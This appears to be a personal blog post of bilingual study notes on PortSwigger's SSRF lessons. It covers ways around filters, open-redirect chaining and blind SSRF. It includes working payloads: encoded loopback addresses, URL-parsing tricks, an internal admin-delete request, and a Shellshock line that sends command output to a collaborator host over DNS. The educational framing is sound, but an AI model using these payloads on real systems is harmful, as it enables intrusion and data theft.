---
layout: article
title: WSAcademy 8 -- SSRF
mathjax: true
key: a00019
cover: /bkgs/1.png
modify_date: 2021-10-17
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- SSRF
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的SSRF部分<!--more-->

原文：https://portswigger.net/web-security/ssrf

# What is SSRF?

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

## Common SSRF attacks

### SSRF attacks against the server itself

the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface

Why do applications implicitly trust requests that come from the local machine? 

This can arise for various reasons:

- [访问控制](https://portswigger.net/web-security/access-control)检查可能在位于应用服务器**前面的另一个组件**中实现。当连接回到服务器本身时就会绕过检查。

- 出于灾难恢复目的，应用程序可能允许对来自本地计算机**的任何用户进行管理访问**，而无需登录

  这为管理员**丢失凭据**时恢复系统提供了一种方法。这里的假设是，只有完全受信任的用户会直接从服务器发请求。

- 管理接口可能正在**侦听与主应用程序不同的端口**，因此用户可能无法直接访问。

### SSRF attacks against other back-end systems

应用服务器能够与用户无法直接访问的**其他后端系统**进行交互

# Circumventing common SSRF defenses

## SSRF with blacklist-based input filters

Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques:

- Using an **alternative IP representation of 127.0.0.1**, such as 2130706433, 017700000001,  or 127.1. （0在linux也行）
- **Registering your own domain name that resolves to 127.0.0.1**. You can use spoofed.burpcollaborator.net for this purpose.
- **Obfuscating** blocked strings using URL  encoding or case variation.

## SSRF with whitelist-based input filters

Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values. In this situation, you can sometimes circumvent the filter by **exploiting inconsistencies in URL parsing**.



The URL specification contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:

- You can **embed credentials** in a URL before the hostname, using the **@** character.

 For example: https://expected-host@evil-host.

- You can use the **#** character to **indicate a URL fragment**. 

For example: https://evil-host#expected-host.

- You can leverage the **DNS naming hierarchy（DNS命名层次结构）** to place required input into a fully-qualified DNS name that you control. 

For example: https://expected-host.evil-host.

- You can **URL-encode characters** to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- You can use **combinations** of these techniques together.

lab：http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos （why?）

## Bypassing via open redirection

It is sometimes possible to circumvent any kind of filter-based defenses by exploiting an **open redirection vulnerability.**

For example, suppose the application contains an open redirection vulnerability in which the following URL:

/product/nextProduct?currentProductId=6&path=http://evil-user.net

returns a redirection to:

http://evil-user.net

You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

能成是因为应用会先验证stockAPI来自允许的域，然后应用请求url并处罚重定向，跟随重定向并发送给定的内部请求

# Blind SSRF 

能打但是没回显

## How to find blind SSRF

The most reliable way to detect blind SSRF vulnerabilities is using **out-of-band** (OAST) techniques

**Note**：

在测试SSRF漏洞时，通常会**观察提供的协作者域的DNS look-up**，但**不观察后续HTTP请求**。这通常是因为应用程序试图向域发出HTTP请求，这导致了初始DNSlookup，但实际的HTTP请求被网络级筛选阻止。对于基础设施来说，允许出站DNS流量是比较常见的，因为这对于许多目的都是必需的，但会阻止到意外目的地的HTTP连接。



仅仅识别可能触发带外HTTP请求的Blind SSRF 本身并不能提供可利用性的途径

但是，它仍然可以用来探测服务器本身或其他后端系统上的其他漏洞。您可以盲扫**内部IP地址空间**，发送用于检测已知漏洞的有效负载

lab：

- install the “Collaborator Everywhere”

- add the site to target scope

- browse and send the user-agent one to intruder 

- change the user-agent with the **Shellshock payload**

  ```bash
  () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
  ```

- change the referer with http://192.168.0.1:8080 and from 1 to 255

- see the dns results in collaborator

Blind SSRF 的另一种途径是诱导应用程序**连接到攻击者控制下的系统**，并向进行连接的HTTP客户端返回恶意响应。

如果可以利用服务器HTTP实现中的严重客户端漏洞进行攻击，则可以在应用程序基础结构中实现远程代码执行。

# Finding hidden attack surface for SSRF vulnerabilities

## Partial URLs in requests

有时，应用程序只将主机名或URL路径的一部分放入请求参数中。然后将提交的值合并到服务器端请求的完整URL中。

如果该值很容易被识别为主机名或URL路径，那么潜在的攻击面可能很明显。

但是，作为完整SSRF的可利用性可能会受到限制，因为无法控制请求的整个URL。

## URLs within data formats

某些应用程序以其规范允许包含数据解析器可能请求的URL的格式传输数据

一个明显的例子是**XML**数据格式，它在web应用程序中被广泛用于将结构化数据从客户端传输到服务器(没几个还用xxe了吧)

当应用程序接受XML格式的数据并对其进行解析时，它可能容易受到XXE注入的攻击，而反过来又容易通过XXE受到SSRF的攻击。

## SSRF via the Referer header

一些应用程序使用服务器端分析软件来跟踪访问者。该软件通常在请求中记录Referer头，因为这对于跟踪传入链接特别重要。通常情况下，分析软件**实际上会访问Referer标题中显示的任何第三方URL**。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer头通常代表SSRF漏洞的有效攻击面



worth reading 

[Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#aux)